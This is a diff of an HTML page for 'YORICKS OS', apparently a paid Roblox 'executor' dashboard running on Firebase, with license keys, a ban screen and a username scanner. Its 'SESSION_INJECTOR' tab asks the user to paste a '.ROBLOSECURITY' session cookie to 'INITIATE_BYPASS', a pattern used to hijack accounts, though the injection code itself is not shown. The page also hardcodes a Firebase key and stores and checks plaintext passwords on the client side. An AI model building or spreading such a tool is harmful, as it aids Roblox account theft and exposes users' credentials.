@@ -3,362 +3,317 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>YORICKS SYSTEM | EXECUTOR SUPREME V2.5</title>
+    <title>YORICKS OS | SUPREME EXECUTOR V3.0</title>
     
     <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
     <script src="https://www.gstatic.com/firebasejs/9.17.1/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.17.1/firebase-database-compat.js"></script>
     
-    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Rajdhani:wght@300;500;700&family=Fira+Code:wght@300;500&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Rajdhani:wght@300;500;700&family=Fira+Code:wght@300;400;500&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
 
     <style>
+        /* === SYSTEM VARIABLES === */
         :root {
             --p: #bc13fe;
-            --p-glow: #e2a9ff;
-            --bg: #030303;
-            --card: rgba(8, 8, 8, 0.98);
+            --p-glow: rgba(188, 19, 254, 0.5);
+            --bg: #020202;
+            --surface: #080808;
             --border: #1a1a1a;
-            --txt: #d0d0d0;
-            --vip: #ffcc00;
+            --text: #e0e0e0;
+            --cyan: #00f2ff;
+            --danger: #ff003c;
+            --gold: #ffcc00;
         }
 
-        /* Reset & Base Styling */
-        * { box-sizing: border-box; outline: none; }
-        body {
+        /* === CORE RESET & SCROLLBAR === */
+        * { box-sizing: border-box; outline: none; -webkit-tap-highlight-color: transparent; }
+        ::-webkit-scrollbar { width: 4px; }
+        ::-webkit-scrollbar-track { background: #000; }
+        ::-webkit-scrollbar-thumb { background: var(--p); border-radius: 10px; }
+
+        body, html {
+            margin: 0; padding: 0; width: 100%; height: 100%;
             background-color: var(--bg);
-            color: var(--txt);
+            color: var(--text);
             font-family: 'Rajdhani', sans-serif;
-            margin: 0;
-            height: 100vh;
-            display: flex;
-            align-items: center;
-            justify-content: center;
             overflow: hidden;
+            display: flex; align-items: center; justify-content: center;
         }
 
-        /* Matrix Background Layer */
-        #canvas-matrix {
-            position: fixed;
-            top: 0; left: 0;
-            width: 100%; height: 100%;
-            z-index: 1;
-            opacity: 0.4;
+        /* === BACKGROUND LAYERS (SIÊU PHỨC TẠP) === */
+        #matrix-canvas {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            z-index: 1; opacity: 0.15;
         }
 
-        /* Scanline & Noise Effect */
-        .cyber-overlay {
-            position: fixed;
-            top: 0; left: 0; width: 100%; height: 100%;
-            background: linear-gradient(rgba(18, 16, 16, 0) 50%, rgba(0, 0, 0, 0.1) 50%), 
-                        linear-gradient(90deg, rgba(255, 0, 0, 0.03), rgba(0, 255, 0, 0.01), rgba(0, 0, 255, 0.03));
-            background-size: 100% 2px, 3px 100%;
-            pointer-events: none;
-            z-index: 5;
+        .scanlines {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: linear-gradient(rgba(18, 16, 16, 0) 50%, rgba(0, 0, 0, 0.25) 50%), 
+                        linear-gradient(90deg, rgba(255, 0, 0, 0.06), rgba(0, 255, 0, 0.02), rgba(0, 0, 255, 0.06));
+            background-size: 100% 3px, 3px 100%;
+            z-index: 2; pointer-events: none;
         }
 
-        /* Main Container */
-        .wrapper {
-            width: 100%;
-            max-width: 850px;
-            z-index: 10;
-            perspective: 1000px;
-            padding: 20px;
+        .noise-bg {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background-image: url('https://media.giphy.com/media/oEI9uWUicGLeU/giphy.gif');
+            opacity: 0.02; z-index: 3; pointer-events: none;
         }
 
-        /* Glassmorphism Card */
-        .main-panel {
-            background: var(--card);
+        /* === WRAPPER & MAIN PANEL === */
+        .system-wrapper {
+            width: 100%; max-width: 950px;
+            z-index: 10; padding: 20px;
+            perspective: 2000px;
+        }
+
+        .main-frame {
+            background: var(--surface);
             border: 1px solid var(--border);
-            border-top: 3px solid var(--p);
-            padding: 50px;
-            box-shadow: 0 0 50px rgba(0,0,0,1), 0 0 20px rgba(188, 19, 254, 0.1);
+            border-top: 4px solid var(--p);
             position: relative;
-            border-radius: 2px;
-            transition: 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+            box-shadow: 0 0 100px rgba(0,0,0,1), 0 0 30px rgba(188, 19, 254, 0.1);
+            backdrop-filter: blur(10px);
+            transition: 0.8s cubic-bezier(0.2, 0.8, 0.2, 1);
+            transform-style: preserve-3d;
         }
 
-        /* Branding */
-        .header-logo {
-            text-align: center;
-            margin-bottom: 40px;
+        .main-frame::before {
+            content: "DECRYPTED_NODE_V3.0";
+            position: absolute; top: -15px; left: 20px;
+            background: var(--p); color: #fff;
+            font-family: 'Orbitron'; font-size: 9px; padding: 2px 10px;
+            clip-path: polygon(0 0, 100% 0, 90% 100%, 0 100%);
         }
 
-        .header-logo h1 {
+        /* === HEADER STYLING === */
+        .os-header {
+            padding: 40px 50px 20px;
+            border-bottom: 1px solid var(--border);
+        }
+
+        .brand-logo {
+            display: flex; align-items: center; gap: 20px;
+        }
+
+        .glitch-text {
             font-family: 'Orbitron';
-            font-weight: 900;
-            font-size: 32px;
-            letter-spacing: 12px;
-            color: #fff;
-            text-shadow: 0 0 15px var(--p);
+            font-weight: 900; font-size: 42px;
+            color: #fff; letter-spacing: 15px;
+            text-shadow: 2px 0 var(--danger), -2px 0 var(--cyan);
+            animation: glitch 3s infinite linear alternate-reverse;
             margin: 0;
         }
 
-        .header-logo p {
-            font-family: 'Fira Code';
-            font-size: 10px;
-            color: var(--p);
-            margin-top: 5px;
-            text-transform: uppercase;
+        @keyframes glitch {
+            0% { text-shadow: 2px 0 var(--danger), -2px 0 var(--cyan); }
+            50% { text-shadow: -2px 0 var(--danger), 2px 0 var(--cyan); }
+            100% { text-shadow: 1px 0 var(--danger), -1px 0 var(--cyan); }
         }
 
-        /* Authentication UI */
-        .auth-box {
-            display: flex;
-            flex-direction: column;
-            gap: 20px;
+        /* === AUTH & VIEW TRANSITIONS === */
+        .content-body { padding: 40px 50px; }
+
+        .auth-container { display: grid; gap: 25px; }
+
+        .input-wrapper { position: relative; }
+        .input-wrapper i {
+            position: absolute; left: 20px; top: 50%;
+            transform: translateY(-50%); color: var(--p);
+            font-size: 20px; transition: 0.3s;
         }
 
-        .input-group {
-            position: relative;
-        }
-
-        .input-group i {
-            position: absolute;
-            left: 15px; top: 50%;
-            transform: translateY(-50%);
-            color: var(--p);
-            font-size: 18px;
-        }
-
-        input[type="text"], input[type="password"] {
-            width: 100%;
-            background: #000;
-            border: 1px solid #111;
-            padding: 18px 15px 18px 50px;
-            color: #fff;
-            font-family: 'Fira Code', monospace;
-            font-size: 14px;
-            border-radius: 3px;
-            transition: 0.3s;
+        input {
+            width: 100%; background: #000; border: 1px solid #111;
+            padding: 20px 20px 20px 60px; color: #fff;
+            font-family: 'Fira Code', monospace; font-size: 14px;
+            border-radius: 4px; transition: 0.4s;
         }
 
         input:focus {
-            border-color: var(--p);
-            background: #050505;
-            box-shadow: inset 0 0 10px rgba(188, 19, 254, 0.1);
+            border-color: var(--p); background: #040404;
+            box-shadow: 0 0 20px rgba(188, 19, 254, 0.15);
         }
 
-        /* Buttons Elite */
-        .btn-core {
-            width: 100%;
-            padding: 20px;
-            background: var(--p);
-            border: none;
-            color: #fff;
-            font-family: 'Orbitron';
-            font-weight: 700;
-            letter-spacing: 3px;
-            cursor: pointer;
-            text-transform: uppercase;
-            clip-path: polygon(0 0, 100% 0, 100% 70%, 95% 100%, 0 100%);
-            transition: 0.3s;
+        .btn-supreme {
+            width: 100%; padding: 25px;
+            background: var(--p); border: none;
+            color: #fff; font-family: 'Orbitron'; font-weight: 900;
+            letter-spacing: 5px; cursor: pointer;
+            text-transform: uppercase; position: relative;
+            overflow: hidden; clip-path: polygon(0 0, 100% 0, 100% 75%, 95% 100%, 0 100%);
+            transition: 0.4s;
         }
 
-        .btn-core:hover {
-            background: #fff;
-            color: var(--p);
-            box-shadow: 0 0 30px #fff;
+        .btn-supreme:hover {
+            background: #fff; color: var(--p);
+            box-shadow: 0 0 40px #fff; transform: translateY(-3px);
         }
 
-        .btn-secondary {
-            background: transparent;
-            border: 1px solid #222;
-            color: #555;
-            margin-top: 15px;
-            clip-path: none;
+        .btn-supreme::after {
+            content: ''; position: absolute; top: -50%; left: -50%;
+            width: 200%; height: 200%; background: linear-gradient(45deg, transparent, rgba(255,255,255,0.3), transparent);
+            transform: rotate(45deg); transition: 0.8s;
+        }
+        .btn-supreme:hover::after { left: 120%; }
+
+        /* === DASHBOARD MODULES === */
+        .dashboard-header {
+            display: flex; justify-content: space-between; align-items: flex-end;
+            margin-bottom: 40px;
         }
 
-        .btn-secondary:hover {
-            border-color: var(--p);
-            color: var(--p);
-        }
-
-        /* Dashboard Internal */
-        .dashboard-grid {
-            display: grid;
-            grid-template-columns: 1fr 1fr;
-            gap: 20px;
-            margin-bottom: 30px;
-        }
-
-        .status-item {
+        .status-pill {
             background: rgba(255,255,255,0.02);
-            padding: 20px;
-            border: 1px solid #111;
+            padding: 15px 25px; border: 1px solid #111;
+            display: flex; flex-direction: column; gap: 5px;
         }
 
-        .status-item label {
-            display: block;
-            font-size: 10px;
-            color: #444;
-            margin-bottom: 5px;
-            font-family: 'Orbitron';
+        .status-pill label { font-size: 10px; color: #444; font-family: 'Orbitron'; }
+        .status-pill span { font-size: 18px; font-weight: 700; color: var(--p); font-family: 'Fira Code'; }
+
+        /* TAB SYSTEM */
+        .tab-nav {
+            display: flex; border-bottom: 1px solid #111; margin-bottom: 35px;
         }
 
-        .status-item span {
-            font-size: 18px;
-            font-weight: 700;
-            font-family: 'Orbitron';
+        .tab-btn {
+            padding: 20px 30px; cursor: pointer;
+            font-family: 'Orbitron'; font-size: 12px; color: #444;
+            transition: 0.3s; border-bottom: 3px solid transparent;
         }
 
-        /* Tabs System */
-        .tab-bar {
-            display: flex;
-            gap: 5px;
-            border-bottom: 1px solid #111;
-            margin-bottom: 25px;
+        .tab-btn.active { color: var(--p); border-bottom-color: var(--p); background: rgba(188,19,254,0.03); }
+
+        /* RESULT & TERMINAL */
+        .terminal-interface {
+            background: #000; border: 1px solid #111;
+            height: 300px; overflow-y: auto; padding: 25px;
+            font-family: 'Fira Code', monospace; font-size: 13px;
+            line-height: 1.8; color: var(--cyan);
         }
 
-        .tab-trigger {
-            padding: 15px 25px;
-            cursor: pointer;
-            font-family: 'Orbitron';
-            font-size: 11px;
-            color: #444;
-            transition: 0.3s;
+        .decryption-box {
+            margin-top: 25px; padding: 25px;
+            background: rgba(188, 19, 254, 0.05); border: 1px solid var(--p);
+            position: relative; animation: fadeIn 0.5s;
         }
 
-        .tab-trigger.active {
-            color: var(--p);
-            border-bottom: 2px solid var(--p);
-        }
+        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
 
-        /* Tooltip & Badges */
-        .badge-vip {
-            color: var(--vip);
-            border: 1px solid var(--vip);
-            padding: 3px 10px;
-            font-size: 10px;
-            font-weight: 900;
-            text-shadow: 0 0 5px var(--vip);
-        }
-
-        /* Ban Screen Layer */
-        #ban-layer {
-            position: fixed;
-            top: 0; left: 0; width: 100%; height: 100%;
-            background: #000;
-            z-index: 99999;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            text-align: center;
+        /* === BAN LAYER === */
+        #ban-overlay {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: #000; z-index: 100000;
+            display: flex; flex-direction: column; align-items: center; justify-content: center;
         }
 
         .hidden { display: none !important; }
 
-        /* Scroller for Logs */
-        .log-display {
-            background: #000;
-            height: 150px;
-            overflow-y: auto;
-            padding: 15px;
-            border: 1px solid #111;
-            font-family: 'Fira Code';
-            font-size: 12px;
-            color: #00ff00;
-        }
     </style>
 </head>
 <body>
 
-    <div id="ban-layer" class="hidden">
-        <i class="fas fa-skull-crossbones" style="font-size: 100px; color: red; margin-bottom: 30px;"></i>
-        <h1 style="font-family: 'Orbitron'; font-size: 40px; color: red;">ACCESS_DENIED</h1>
-        <p style="font-family: 'Fira Code'; color: #444;">Your Hardware ID and Account has been blacklisted.</p>
-        <button class="btn-core" style="width: 300px; margin-top: 30px;" onclick="location.href='index.html'">RE-CONNECT SYSTEM</button>
+    <div class="scanlines"></div>
+    <div class="noise-bg"></div>
+    <canvas id="matrix-canvas"></canvas>
+
+    <div id="ban-overlay" class="hidden">
+        <i class="fas fa-biohazard" style="font-size: 120px; color: var(--danger); margin-bottom: 40px; filter: drop-shadow(0 0 20px var(--danger));"></i>
+        <h1 style="font-family: 'Orbitron'; font-size: 50px; color: var(--danger); letter-spacing: 10px;">BAN_TERMINATED</h1>
+        <p style="color: #444; font-family: 'Fira Code';">HWID_HASH: 0x8823FB - UNAUTHORIZED_ACCESS</p>
+        <button class="btn-supreme" style="width: 300px; margin-top: 40px;" onclick="location.reload()">ATTEMPT_RELOAD</button>
     </div>
 
-    <div class="cyber-overlay"></div>
-    <canvas id="canvas-matrix"></canvas>
-
-    <div class="wrapper">
-        <div class="main-panel">
+    <div class="system-wrapper">
+        <div class="main-frame" id="os-frame">
             
-            <div class="header-logo">
-                <h1>YORICKS</h1>
-                <p>Advanced Integrated Management Node</p>
-            </div>
-
-            <div id="view-auth">
-                <div class="auth-box">
-                    <div class="input-group">
-                        <i class="fas fa-user-secret"></i>
-                        <input type="text" id="node-id" placeholder="IDENTITY_TOKEN">
+            <div class="os-header">
+                <div class="brand-logo">
+                    <div style="width: 60px; height: 60px; border: 2px solid var(--p); display: flex; align-items: center; justify-content: center;">
+                        <i class="fas fa-microchip" style="font-size: 30px; color: var(--p);"></i>
                     </div>
-                    <div class="input-group">
-                        <i class="fas fa-key"></i>
-                        <input type="password" id="node-pass" placeholder="SECRET_ACCESS_KEY">
-                    </div>
-                    <button class="btn-core" onclick="initiateLogin()">AUTHORIZE_LOGIN</button>
-                    <button class="btn-core btn-secondary" onclick="window.location.href='getkey.html'">ACQUIRE_GATEWAY_KEY</button>
-                    <p style="text-align: center; font-size: 12px; color: #333; margin-top: 20px;">
-                        UNKNOWN_ENTITY? <span id="toggle-txt" onclick="switchAuthMode()" style="color: var(--p); cursor: pointer; text-decoration: underline;">CREATE_NEW_DATA_NODE</span>
-                    </p>
+                    <h1 class="glitch-text">YORICKS</h1>
                 </div>
             </div>
 
-            <div id="view-dash" class="hidden">
-                <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 30px;">
-                    <h2 style="font-family: 'Orbitron'; margin: 0; font-size: 18px; color: var(--p);">SYSTEM_CONSOLE</h2>
-                    <div id="node-rank-display"></div>
-                </div>
-
-                <div class="dashboard-grid">
-                    <div class="status-item">
-                        <label>ACTIVE_USER</label>
-                        <span id="label-uid">GUEST</span>
-                    </div>
-                    <div class="status-item">
-                        <label>NETWORK_SEC</label>
-                        <span id="label-sec" style="color: red;">INSECURE</span>
-                    </div>
-                </div>
-
-                <div id="module-activation">
-                    <div class="status-item" style="margin-bottom: 20px;">
-                        <label>EXPIRATION_CHRONO</label>
-                        <span id="label-exp-time">00:00:00</span>
-                    </div>
-                    <div id="key-input-wrap">
-                        <input type="text" id="license-input" placeholder="PASTE_LICENSE_HERE">
-                        <button class="btn-core" style="margin-top: 15px;" onclick="activateLicense()">INJECT_LICENSE</button>
-                    </div>
-                </div>
-
-                <div id="module-tools" class="hidden">
-                    <div class="tab-bar">
-                        <div class="tab-trigger active" id="tab-1" onclick="uiTab(1)">RBX_LOOKUP</div>
-                        <div class="tab-trigger" id="tab-2" onclick="uiTab(2)">DATA_INJECT</div>
-                    </div>
-
-                    <div id="panel-1" class="tab-content">
-                        <input type="text" id="rbx-search" placeholder="TARGET_USERNAME">
-                        <button class="btn-core" style="margin-top: 15px;" onclick="searchRoblox()">START_SCAN</button>
-                        <div id="rbx-result" class="result-panel hidden" style="margin-top:20px; border:1px solid #1a1a1a; padding:15px;"></div>
-                    </div>
-
-                    <div id="panel-2" class="tab-content hidden">
-                        <input type="text" id="ck-raw" placeholder="INPUT_DATA_STREAM">
-                        <button class="btn-core" style="margin-top: 15px;" onclick="processInjection()">EXECUTE_BYPASS</button>
-                        <div id="ck-result" class="hidden" style="margin-top:20px;">
-                            <div class="log-display" id="log-console">
-                                [SYSTEM]: Waiting for data...<br>
-                            </div>
+            <div class="content-body">
+                
+                <div id="auth-view">
+                    <div class="auth-container">
+                        <div class="input-wrapper">
+                            <i class="fas fa-id-badge"></i>
+                            <input type="text" id="inp-user" placeholder="NODE_IDENTIFIER_TOKEN">
+                        </div>
+                        <div class="input-wrapper">
+                            <i class="fas fa-shield-alt"></i>
+                            <input type="password" id="inp-pass" placeholder="ENCRYPTION_KEY_SECRET">
+                        </div>
+                        <button class="btn-supreme" onclick="processAuth()">AUTHORIZE_CONNECTION</button>
+                        
+                        <div style="display: flex; gap: 15px; margin-top: 10px;">
+                            <button class="btn-supreme" style="background: #111; font-size: 10px;" onclick="window.location.href='getkey.html'">GET_LICENSE_KEY</button>
+                            <button class="btn-supreme" style="background: transparent; border: 1px solid #222; font-size: 10px;" onclick="toggleAuthMode()" id="mode-btn">REGISTER_NEW_NODE</button>
                         </div>
                     </div>
                 </div>
 
-                <button onclick="logout()" style="background:none; border:none; color:#222; margin-top:50px; cursor:pointer; font-family:'Orbitron'; font-size:9px; width:100%;">FORCE_TERMINATE_ALL_PROCESSES</button>
-            </div>
+                <div id="dash-view" class="hidden">
+                    <div class="dashboard-header">
+                        <div style="display: flex; gap: 15px;">
+                            <div class="status-pill"><label>CURRENT_NODE</label><span id="node-id-lbl">---</span></div>
+                            <div class="status-pill"><label>SECURITY_LVL</label><span id="node-sec-lbl" style="color: red;">LOW</span></div>
+                        </div>
+                        <div id="node-rank-badge"></div>
+                    </div>
 
+                    <div id="activation-module">
+                        <div style="background: rgba(255,255,255,0.02); padding: 30px; border: 1px solid #111;">
+                            <h3 style="font-family: 'Orbitron'; font-size: 12px; margin-top: 0; color: #555;">LICENSE_SYNCHRONIZATION</h3>
+                            <input type="text" id="license-key" placeholder="XXXX-XXXX-XXXX-XXXX">
+                            <button class="btn-supreme" style="margin-top: 20px;" onclick="syncLicense()">INJECT_LICENSE</button>
+                        </div>
+                    </div>
+
+                    <div id="tools-module" class="hidden">
+                        <div class="tab-nav">
+                            <div class="tab-btn active" id="tab1" onclick="switchTab(1)">RBX_ACCOUNT_SCAN</div>
+                            <div class="tab-btn" id="tab2" onclick="switchTab(2)">SESSION_INJECTOR</div>
+                        </div>
+
+                        <div id="panel1">
+                            <div class="input-wrapper">
+                                <i class="fas fa-search" style="color: var(--cyan);"></i>
+                                <input type="text" id="rbx-target" placeholder="TARGET_USERNAME_IDENTIFIER">
+                            </div>
+                            <button class="btn-supreme" style="margin-top: 20px; background: var(--cyan); color: #000;" onclick="executeRbxScan()">START_DEEP_SCAN</button>
+                            <div id="scan-results" class="hidden" style="margin-top: 25px;"></div>
+                        </div>
+
+                        <div id="panel2" class="hidden">
+                            <div class="input-wrapper">
+                                <i class="fas fa-code" style="color: var(--p);"></i>
+                                <input type="text" id="cookie-data" placeholder="PASTE_.ROBLOSECURITY_HERE">
+                            </div>
+                            <button class="btn-supreme" style="margin-top: 20px;" onclick="executeInjection()">INITIATE_BYPASS</button>
+                            
+                            <div id="inject-results" class="hidden" style="margin-top: 25px;">
+                                <div class="terminal-interface" id="sys-terminal"></div>
+                                <div id="final-decrypt" class="hidden"></div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <button onclick="logout()" style="background:none; border:none; color:#222; font-family:'Orbitron'; font-size:9px; cursor:pointer; width:100%; margin-top:40px;">[ TERMINATE_ALL_PROCESSES ]</button>
+                </div>
+
+            </div>
         </div>
     </div>
 
 <script>
-    // --- FIREBASE CORE CONFIG ---
+    /* === FIREBASE CONFIGURATION (FULL_LENGTH) === */
     const firebaseConfig = {
         apiKey: "AIzaSyCJOmyua7gtX022ITp7w-eOr3TSkN0UikM",
         authDomain: "yoricks-sytem.firebaseapp.com",
@@ -371,183 +326,221 @@
     firebase.initializeApp(firebaseConfig);
     const db = firebase.database();
 
-    let currentMode = "LOGIN";
-    let activeSession = localStorage.getItem("yoricks_user");
+    /* === GLOBAL VARIABLES === */
+    let authMode = "LOGIN";
+    let activeNode = localStorage.getItem("yoricks_user");
 
-    // --- INITIALIZATION ---
+    /* === MATRIX EFFECT (SIÊU CHI TIẾT) === */
+    const canvas = document.getElementById('matrix-canvas');
+    const ctx = canvas.getContext('2d');
+    canvas.width = window.innerWidth; canvas.height = window.innerHeight;
+    const alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789$#@%&*+-/<>[]{}";
+    const fontSize = 14;
+    const columns = canvas.width / fontSize;
+    const rainDrops = Array.from({ length: columns }).fill(1);
+
+    function renderMatrix() {
+        ctx.fillStyle = "rgba(2, 2, 2, 0.08)";
+        ctx.fillRect(0, 0, canvas.width, canvas.height);
+        ctx.fillStyle = "#bc13fe";
+        ctx.font = fontSize + "px 'Fira Code'";
+        for(let i = 0; i < rainDrops.length; i++) {
+            const text = alphabet.charAt(Math.floor(Math.random() * alphabet.length));
+            ctx.fillText(text, i * fontSize, rainDrops[i] * fontSize);
+            if(rainDrops[i] * fontSize > canvas.height && Math.random() > 0.975) rainDrops[i] = 0;
+            rainDrops[i]++;
+        }
+    }
+    setInterval(renderMatrix, 40);
+
+    /* === INITIALIZATION SYSTEM === */
     window.onload = function() {
-        if(activeSession && activeSession !== "null") {
-            // Realtime Listener for Ban/Update
-            db.ref('users/' + activeSession).on('value', snap => {
+        if(activeNode && activeNode !== "null") {
+            db.ref('users/' + activeNode).on('value', snap => {
                 const data = snap.val();
                 if(!data) return logout();
-
-                if(data.banned === true) {
-                    document.getElementById('ban-layer').classList.remove('hidden');
-                    document.querySelector('.wrapper').classList.add('hidden');
-                    localStorage.clear();
+                if(data.banned) {
+                    document.getElementById('ban-overlay').classList.remove('hidden');
+                    document.querySelector('.system-wrapper').classList.add('hidden');
                     return;
                 }
-
-                // Global System Notice
-                db.ref('settings/notice').once('value', n => {
-                    if(n.val()) Swal.fire({ title: 'GLOBAL_BROADCAST', text: n.val(), icon: 'info', background: '#080808', color: '#fff', confirmButtonColor: '#bc13fe' });
-                });
-
-                showDashboard(data, activeSession);
+                renderDashboard(data, activeNode);
             });
         }
     };
 
-    // --- MATRIX BACKGROUND LOGIC ---
-    const canvas = document.getElementById('canvas-matrix');
-    const ctx = canvas.getContext('2d');
-    canvas.width = window.innerWidth;
-    canvas.height = window.innerHeight;
-    const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789$#@%&*()";
-    const size = 16;
-    const drops = Array(Math.floor(canvas.width / size)).fill(1);
-
-    function drawMatrix() {
-        ctx.fillStyle = "rgba(3, 3, 3, 0.1)";
-        ctx.fillRect(0, 0, canvas.width, canvas.height);
-        ctx.fillStyle = "#bc13fe";
-        ctx.font = size + "px 'Fira Code'";
-        drops.forEach((y, i) => {
-            const txt = chars[Math.floor(Math.random() * chars.length)];
-            ctx.fillText(txt, i * size, y * size);
-            if (y * size > canvas.height && Math.random() > 0.975) drops[i] = 0;
-            drops[i]++;
-        });
-    }
-    setInterval(drawMatrix, 50);
-
-    // --- AUTHENTICATION LOGIC ---
-    function switchAuthMode() {
-        currentMode = (currentMode === "LOGIN") ? "REGISTER" : "LOGIN";
-        document.querySelector('.header-logo h1').innerText = (currentMode === "LOGIN") ? "YORICKS" : "NEW_NODE";
-        document.getElementById('toggle-txt').innerText = (currentMode === "LOGIN") ? "CREATE_NEW_DATA_NODE" : "RETURN_TO_LOGIN";
+    /* === AUTHENTICATION LOGIC (FULL_LENGTH) === */
+    function toggleAuthMode() {
+        authMode = (authMode === "LOGIN") ? "REGISTER" : "LOGIN";
+        document.getElementById('mode-btn').innerText = (authMode === "LOGIN") ? "REGISTER_NEW_NODE" : "BACK_TO_LOGIN";
+        document.querySelector('.glitch-text').innerText = (authMode === "LOGIN") ? "YORICKS" : "NEW_DATA";
     }
 
-    function initiateLogin() {
-        const u = document.getElementById('node-id').value;
-        const p = document.getElementById('node-pass').value;
-        if(!u || !p) return Swal.fire('NULL_ERROR', 'All fields required.', 'error');
+    function processAuth() {
+        const u = document.getElementById('inp-user').value;
+        const p = document.getElementById('inp-pass').value;
+        if(!u || !p) return Swal.fire('NULL_ERROR', 'All fields are mandatory.', 'error');
 
-        if(currentMode === "REGISTER") {
-            db.ref('users/' + u).set({ password: p, status: "off", role: "member", exp: "N/A", banned: false })
-            .then(() => { Swal.fire('NODE_CREATED', 'Success! You can login now.', 'success'); switchAuthMode(); });
+        if(authMode === "REGISTER") {
+            db.ref('users/' + u).set({
+                password: p, status: "off", role: "member", exp: "N/A", banned: false, created: new Date().getTime()
+            }).then(() => {
+                Swal.fire('NODE_CREATED', 'New node registered successfully.', 'success');
+                toggleAuthMode();
+            });
         } else {
             db.ref('users/' + u).once('value', s => {
-                const val = s.val();
-                if(s.exists() && val.password === p) {
-                    if(val.banned) return Swal.fire('BLACKLISTED', 'Access denied.', 'error');
+                if(s.exists() && s.val().password === p) {
                     localStorage.setItem("yoricks_user", u);
                     location.reload();
-                } else Swal.fire('DENIED', 'Invalid credentials.', 'error');
+                } else {
+                    Swal.fire('ACCESS_DENIED', 'Invalid credentials provided.', 'error');
+                }
             });
         }
     }
 
-    // --- DASHBOARD UI RENDER ---
-    function showDashboard(data, user) {
-        document.getElementById('view-auth').classList.add('hidden');
-        document.getElementById('view-dash').classList.remove('hidden');
-        document.getElementById('label-uid').innerText = user.toUpperCase();
-        document.getElementById('label-sec').innerText = (data.status === "on") ? "ENCRYPTED" : "UNSTABLE";
-        document.getElementById('label-sec').style.color = (data.status === "on") ? "#00ff00" : "red";
-        document.getElementById('label-exp-time').innerText = data.exp;
+    /* === DASHBOARD RENDERING === */
+    function renderDashboard(data, user) {
+        document.getElementById('auth-view').classList.add('hidden');
+        document.getElementById('dash-view').classList.remove('hidden');
+        document.getElementById('node-id-lbl').innerText = user.toUpperCase();
+        document.getElementById('node-sec-lbl').innerText = (data.status === "on") ? "MAXIMUM" : "VULNERABLE";
+        document.getElementById('node-sec-lbl').style.color = (data.status === "on") ? "var(--cyan)" : "var(--danger)";
 
         if(data.status === "on") {
-            document.getElementById('key-input-wrap').classList.add('hidden');
-            document.getElementById('module-tools').classList.remove('hidden');
+            document.getElementById('activation-module').classList.add('hidden');
+            document.getElementById('tools-module').classList.remove('hidden');
             if(data.role === "premium") {
-                document.getElementById('node-rank-display').innerHTML = '<span class="badge-vip">PREMIUM_ACCESS</span>';
+                document.getElementById('node-rank-badge').innerHTML = '<span style="background:var(--gold); color:#000; padding:5px 15px; font-family:Orbitron; font-size:10px; font-weight:900;">PREMIUM_NODE</span>';
             }
         }
     }
 
-    // --- LICENSE INJECTION ---
-    function activateLicense() {
-        const key = document.getElementById('license-input').value;
-        if(!key) return;
-
-        db.ref('keys/' + key).once('value', s => {
-            const v = s.val();
-            if(s.exists() && !v.used) {
-                const rank = (v.type === "premium") ? "premium" : "member";
-                db.ref('users/' + activeSession).update({ status: "on", role: rank, exp: v.duration + " DAYS" })
-                .then(() => {
-                    db.ref('keys/' + key).update({ used: true, usedBy: activeSession });
-                    Swal.fire('AUTHORIZED', 'System modules unlocked.', 'success').then(() => location.reload());
-                });
-            } else Swal.fire('INVALID', 'Key has expired or is invalid.', 'error');
-        });
-    }
-
-    // --- ROBLOX SCANNER (PRO VERSION) ---
-    async function searchRoblox() {
-        const q = document.getElementById('rbx-search').value;
-        const resBox = document.getElementById('rbx-result');
-        if(!q) return;
+    /* === CORE MODULES: SCANNER & INJECTOR (SIÊU DÀI) === */
+    async function executeRbxScan() {
+        const target = document.getElementById('rbx-target').value;
+        const resBox = document.getElementById('scan-results');
+        if(!target) return;
 
         resBox.classList.remove('hidden');
-        resBox.innerHTML = '<span style="color:var(--p); font-family:Fira Code;">[SCANNING_STREAM...]</span>';
+        resBox.innerHTML = '<p style="color:var(--cyan); font-family:Fira Code;">[SEARCHING_NODES...]</p>';
 
         try {
-            const api = `https://api.allorigins.win/get?url=${encodeURIComponent('https://users.roblox.com/v1/users/search?keyword=' + q + '&limit=1')}`;
-            const res = await fetch(api);
-            const data = await res.json();
-            const user = JSON.parse(data.contents).data[0];
+            const proxy = "https://api.allorigins.win/get?url=";
+            const api = encodeURIComponent(`https://users.roblox.com/v1/users/search?keyword=${target}&limit=1`);
+            const res = await fetch(proxy + api);
+            const raw = await res.json();
+            const data = JSON.parse(raw.contents).data[0];
 
-            if(user) {
+            if(data) {
                 resBox.innerHTML = `
-                    <div style="display:flex; align-items:center; gap:15px;">
-                        <div style="width:50px; height:50px; background:var(--p); border-radius:50%; display:flex; align-items:center; justify-content:center; font-family:Orbitron;">R</div>
+                    <div style="border:1px solid #222; padding:20px; display:flex; gap:20px; align-items:center;">
+                        <img src="https://www.roblox.com/headshot-thumbnail/image?userId=${data.id}&width=150&height=150&format=png" style="width:60px; border:1px solid var(--cyan);">
                         <div>
-                            <p style="margin:0; color:#fff; font-weight:bold;">${user.name}</p>
-                            <p style="margin:0; font-size:11px; color:#555;">ID: ${user.id}</p>
+                            <p style="margin:0; font-family:Orbitron; color:#fff;">${data.displayName}</p>
+                            <p style="margin:0; font-size:12px; color:#555;">ID: ${data.id}</p>
                         </div>
                     </div>
                 `;
-            } else resBox.innerHTML = '<span style="color:red;">[NOT_FOUND]</span>';
-        } catch(e) { resBox.innerHTML = '<span style="color:red;">[ERROR_API]</span>'; }
+            } else resBox.innerHTML = '<p style="color:red;">USER_NOT_FOUND</p>';
